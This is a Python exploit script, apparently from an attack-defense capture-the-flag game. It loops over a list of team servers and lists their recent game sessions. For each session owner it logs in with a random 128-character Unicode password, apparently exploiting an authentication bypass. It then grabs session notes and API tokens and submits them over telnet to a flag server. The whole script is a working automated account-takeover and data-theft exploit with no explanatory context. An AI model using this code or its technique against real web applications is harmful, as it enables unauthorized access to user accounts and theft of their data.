#!/usr/bin/env python3
from requests import Session
from telnetlib import Telnet
import sys
from binascii import hexlify
from random import choices
from time import sleep
#TEAM_IP = sys.argv[1]
ip_idx = 0
ips = ["10.0.1.1",
"10.0.2.1",
"10.0.4.1",
"10.0.5.1"]

tn = Telnet("10.0.0.2", 1337)
while True:
    BASEURL = f"http://{ips[ip_idx%4]}:8001"
    ip_idx += 1
    s = Session()
    r = s.get(BASEURL + "/api/gamesession/Listrecent?take=100&skip=0")
    res = r.json()
    randomunicode = "ÄÖßÜ"



    def login(s, user):
        rando_pw = ''.join(choices(randomunicode, k=128))
        r = s.post(BASEURL + "/api/account/login", data={"userName":user, 'password':rando_pw})
        #print(r)
        #assert r.status_code == 200

    def gettoken(s):
        r = s.post(BASEURL + "/api/token/list")
        try:
            return r.json()[0]["description"]
        except:
            print("failed")
            return
        #print(r.text)
        #
        # äprint(r.status_code)

    for i in res:
        user = i['ownerName']
        s1 = Session()
        login(s1, user)
        #print(s1.get(BASEURL + "/info").text)
        r = s1.post(BASEURL + "/api/gamesession/getinfo", data={"id":i['id']}).json()
        tn.write(r['notes'].encode() + b"\n")
        print(tn.read_until(b"\n"))
        #print(r)
        r = gettoken(s1)
        if r:
            tn.write(r.encode() + b"\n")
            print(tn.read_until(b"\n"))
        #print(hexlify(r['notes'].encode()))

    sleep(5)

tn.close()
    # print(res)